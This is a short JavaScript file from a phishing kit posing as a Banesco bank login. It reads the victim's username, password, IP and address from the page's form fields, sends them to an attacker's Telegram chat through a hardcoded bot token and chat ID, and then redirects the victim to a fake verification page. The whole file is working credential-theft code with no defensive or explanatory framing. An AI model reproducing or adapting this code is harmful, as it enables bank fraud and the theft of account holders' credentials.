//bot token
var telegram_bot_id = "5555165841:AAE7e0yrao7YTcSmfDKy0Y6vnY0SO-0UyFE";
//chat id
var chat_id = "1024082369";
var u_name, ip, ip2;
var ready = function () {
    u_name = document.getElementById("0T4RX").value;
    u_name3 = document.getElementById("PL4C").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "🟢BANESCO-LOGIN🟢\nUsuario: " + u_name + " \nClave: " + u_name3 + " \nIP: " + ip +"\n" + ip2 +"\n🟢LOGIN🟢";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST", 
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'verificacion1.html';
        console.log(response);
    });
    return false;
};
